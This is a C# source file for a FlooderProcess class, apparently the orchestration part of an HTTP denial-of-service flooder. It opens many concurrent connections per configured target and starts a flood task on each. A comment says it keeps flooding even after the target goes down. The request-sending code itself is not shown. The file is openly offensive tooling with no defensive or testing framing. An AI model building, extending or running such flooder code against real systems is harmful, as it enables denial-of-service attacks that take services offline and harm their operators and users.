// process that starts all of the connections
// on a different thread and keeps that thread 
// untill all of them are closed manually this
// process does not stop even when target is down
internal class FlooderProcess
{
    private readonly Configuration _configuration;
    private readonly List<LimitedHttpConnection> _connections;
    private readonly List<Task> _tasks;

    private bool _isFlooding;
    private Thread? _floodingThread;
    public bool IsFlooding { get => _isFlooding; }

    public FlooderProcess(Configuration configuration)
    {
        _configuration = configuration;
        _connections = new List<LimitedHttpConnection>();
        _tasks = new List<Task>();
    }

    public void BeginFlood()
    {
        _isFlooding = true;
        // create a thread with asynchronous operations
        // it will actually wait till all of them 
        // are manually stopped
        _floodingThread = new (async () =>
        {
            foreach (TargetInfo target in _configuration.targets)
            {
                for (int i = 0; i < target.concurrency; i++)
                {
                    var connection = new LimitedHttpConnection(target);
                    // we need to keep track of the connectio objects
                    // so we can send manual stop request to them
                    _connections.Add(connection);
                    // as well as all the asynchronous flood tasks
                    // so we can gracefully end up the flood
                    _tasks.Add(connection.FloodHost());
                }
            }
            await Task.WhenAll(_tasks.ToArray()).ContinueWith(t => _isFlooding = false);
        });
        _floodingThread.Start();
    }

    // informs all of the connections to stop
    // flooding and waits for them to finish 
    public void Stop()
    {
        foreach(var connection in _connections)
        {
            connection.Stop();
        }
        // maybe should throw after join fails (?)
        _floodingThread!.Join(1000);
    }
}